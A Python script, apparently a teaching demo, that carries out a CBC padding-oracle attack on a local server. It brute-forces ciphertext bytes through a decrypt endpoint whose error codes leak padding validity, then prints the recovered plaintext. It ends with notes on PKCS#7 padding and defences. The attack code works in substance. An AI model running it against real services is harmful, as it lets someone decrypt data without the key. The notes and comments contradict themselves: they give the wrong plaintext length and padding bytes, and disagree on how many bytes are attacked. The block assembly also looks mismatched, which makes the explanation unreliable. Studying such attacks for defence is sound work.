import requests
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BLOCK_SIZE = 16
URL = "http://localhost:5000/decrypt"

# ▶️ Step 1: Prepare ciphertext to simulate a real scenario
# plaintext = b"Secret message here!"
# KEY = os.urandom(BLOCK_SIZE)
# IV = os.urandom(BLOCK_SIZE)

# # (Encrypt plaintext as server does)
# cipher = AES.new(KEY, AES.MODE_CBC, IV)
# ciphertext = IV + cipher.encrypt(pad(plaintext, BLOCK_SIZE))

# Get ciphertext from server (pre-encrypted from server-side). NOTE: Exactly as the attacker intercepted on the network. Instead of sniffing from the traffic, we "pretend" to get it from /ciphertext.
ciphertext = bytes.fromhex(requests.get("http://localhost:5000/ciphertext").json()["ciphertext"])
print("Ciphertext received from server:", ciphertext.hex())

# ▶️ Step 2: Split into 16-byte blocks
blocks = [ciphertext[i:i+BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]

def padding_oracle(modified_ciphertext: bytes) -> bool:
    """
    Sends a modified ciphertext to the server and returns True if the padding is valid.
    """
    # hex_data = modified_ciphertext.hex()
    # response = requests.post(URL, json={"data": hex_data})
    response = requests.post(URL, json={"data": modified_ciphertext.hex()})
    return response.status_code != 403  # If 403, it's a padding error

def attack_block(prev_block: bytes, target_block: bytes) -> bytes:
    """
    Recovers the plaintext for the given target_block by manipulating the preceding block.
    Only the last 2 bytes are targeted for faster demonstration.
    """
    recovered = bytearray(BLOCK_SIZE)
    intermediate = bytearray(BLOCK_SIZE)

    # Only attack the last 8 bytes to reduce brute-force time
    for i in reversed(range(BLOCK_SIZE)):
    # for i in reversed(range(BLOCK_SIZE - 8, BLOCK_SIZE)): # Only last 8 bytes to save time
        print(f"Attacking byte {i + 1} of the last block --------")
        pad_byte = BLOCK_SIZE - i
        prefix = bytearray(os.urandom(i))

        for guess in range(256):
            test_block = bytearray(prefix)
            test_block.append(guess)

            # Set already-known intermediate values for padding
            for j in range(BLOCK_SIZE - i - 1):
                test_block.append(intermediate[i + 1 + j] ^ pad_byte)

            # fake = bytes(test_block) + target_block
            # fake_prev = test_block + target_block
            # fake_full = bytes(test_block) + target_block

            # Assemble the forged ciphertext: (modified_prev_block || target_block)
            full_cipher = b''.join(blocks[:-2]) + bytes(test_block) + target_block
            print(f"Trying byte at position {i}, guess = {guess:02x}")

            if padding_oracle(full_cipher):
                intermediate[i] = guess ^ pad_byte
                recovered[i] = intermediate[i] ^ prev_block[i]
                break

    return recovered

# recovered_plain = attack_block(blocks[-2], blocks[-1])
recovered_plain = attack_block(blocks[0], blocks[1])
print("Recovered plaintext:", recovered_plain.decode())

"""
Simulate how an attacker can decrypt plaintext from ciphertext without knowing the key, based only on error responses from the server.
oracle_server.py simulates a server receiving ciphertext and responding according to padding
attacker.py simulates an attacker who doesn't know the key but gradually guesses the plaintext
When the run is complete, you'll see the original plaintext printed from the ciphertext without the key

# Idea: change the last byte and see when the server **doesn't report an error**
# Probe the last byte of the plaintext by brute-force xor byte with the previous block.

🛡️ How to avoid Padding Oracle
  Never respond to specific errors about padding!
  Always authenticate (MAC/HMAC) before decrypting.
  Use modern modes like GCM instead of CBC.
"""

"""
🔐 1. Plaintext:
NOTE: length is 21 bytes. AES uses CBC mode with block size = 16 byte, so needing padding


🧱 2. Split block of 16 bytes (after padding):
Using Crypto.Util.Padding.pad(plaintext, 16) → auto adding padding PKCS#7 like below:

| Plaintext (21 bytes)   | Sẽ được pad thêm      | Total              |
| ---------------------- | --------------------- | ------------------ |
| `Secret message here!` | 11 bytes = `0B` \* 11 | 32 bytes (2 block) |

Result after padding: b'Secret message here!\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'

🔄 3. Divide into blocks:
AES block size = 16 byte ⇒:

| Block 1 (Ciphertext1) | Block 2 (Ciphertext2)                               |
| --------------------- | --------------------------------------------------- |
| b'Secret message h'   | b'ere!\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b' |
👉 "ere!" is at the beginning of block 2 — that is, block 2 contains the word "ere!" and the padding.

TODO: to upgrade the demo to:
- attacker intercepts ciphertext from MITM
- attack multiple blocks
- generate fake code like in CTFs
"""